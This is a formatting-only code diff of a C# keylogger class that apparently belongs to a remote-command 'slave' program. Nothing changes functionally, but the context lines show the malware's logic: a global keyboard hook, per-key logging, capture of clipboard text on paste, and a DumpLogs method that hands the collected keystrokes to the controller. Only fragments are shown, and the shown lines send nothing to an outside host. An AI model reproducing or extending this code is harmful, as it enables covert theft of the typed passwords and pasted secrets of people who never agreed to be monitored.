@@ -17,7 +17,6 @@ namespace Slave.Commands.KeyLogger
 
         bool ctrlState;
 
-
         /// <summary>
         /// Initialize the keyboard hook
         /// Install the keyboard hook and the related events
@@ -31,7 +30,6 @@ namespace Slave.Commands.KeyLogger
             keyboardHook.Install();
             logger = new Logger();
         }
-
 
         /// <summary>
         /// Enable the hook to process keys
@@ -51,12 +49,10 @@ namespace Slave.Commands.KeyLogger
             keyboardHook.listening = true;
         }
 
-
         /// <summary>
         /// Stop the hook from processing keys
         /// </summary>
         public void StopListening() => keyboardHook.listening = false;
-
 
         /// <summary>
         /// When a key is pressed, process and log it
@@ -111,7 +107,7 @@ namespace Slave.Commands.KeyLogger
                 // Normal characters (alpha + num)
                 if ((key == "V" || key == "C") && ctrlState)
                 {
-                    if(key == "V")
+                    if (key == "V")
                     {
                         logger.LogKey(" <Pasted>" + Clipboard.GetText() + "</Pasted> ");
                     }
@@ -131,7 +127,6 @@ namespace Slave.Commands.KeyLogger
                 logger.LogKey(" <" + key + "> ");
             }
         }
-
 
         /// <summary>
         /// When a key is released, process and log it if it's of interest
@@ -153,7 +148,6 @@ namespace Slave.Commands.KeyLogger
             }
         }
 
-
         /// <summary>
         /// Clear all events related to the keyboard hook, discard the hook
         /// </summary>
@@ -164,13 +158,11 @@ namespace Slave.Commands.KeyLogger
             keyboardHook.Uninstall();
         }
 
-
         /// <summary>
         /// Provides an access to the logger's GetLog() method outside of the namespace
         /// </summary>
         /// <returns>Log's content</returns>
         public string DumpLogs() => logger.GetLogs();
-
 
         /// <summary>
         /// Returns the hook's listening status
